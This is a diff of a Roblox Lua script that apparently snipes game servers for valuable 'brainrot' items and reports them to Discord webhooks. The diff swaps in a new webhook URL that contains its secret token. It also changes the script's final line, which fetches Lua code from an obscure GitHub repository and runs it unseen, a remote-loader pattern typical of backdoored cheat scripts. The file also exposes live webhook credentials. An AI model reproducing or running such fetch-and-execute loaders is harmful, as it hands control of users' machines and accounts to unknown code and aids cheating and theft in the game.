@@ -1,3 +1,4 @@
+
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
@@ -84,7 +85,7 @@ local WEBHOOKS = {
         showJoinerAd = true
     },
     { -- Special brainrots + overpay + mutations
-        url = 'https://discord.com/api/webhooks/1457015322119897133/kQkqA4AMYLVviEYFT7Rf4Udz6ATSRYPVcPeDtALzHFfveew7jmjGCPE6Q-5KAZViCaIE',
+        url = 'https://discord.com/api/webhooks/1456411967941120194/5BhYfK-zbqoe_tG7SxHBXysz0IIJj1V4pPXh7LjnZz62vXTv5Z2AWDGT-CGii1xKjTEv',
         title = '⭐️ SPECIAL BRAINROTS + MUTATIONS',
         color = 0xff00ff,
         special = true,
@@ -95,7 +96,7 @@ local WEBHOOKS = {
 
 -- 📋 SPECIAL BRAINROTS WITH MIN VALUES + MUTATIONS
 local SPECIAL_BRAINROTS = {
-    ['Garama and Madundung'] = { min = 999999909, mutations = {} },
+    ['Garama and Madundung'] = { min = 9999999999999999, mutations = {} },
 }
 
 -- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
@@ -241,7 +242,6 @@ local OBJECTS = {
     ['Giftini Spyderini'] = { emoji = '🕷', important = true },
     ['Cerberus'] = { emoji = '👹', important = true },
     ['Ay Mi Gatito'] = { emoji = '😻', important = true },
-    ['AY MI GATITO MIAU MIAU'] = { emoji = '😻', important = true },
 }
 
 local ALWAYS_IMPORTANT = {}
@@ -846,4 +846,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dsfsdfs21cfc/yrhgnjrtyjh333/refs/heads/main/g5hg45yhhop.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
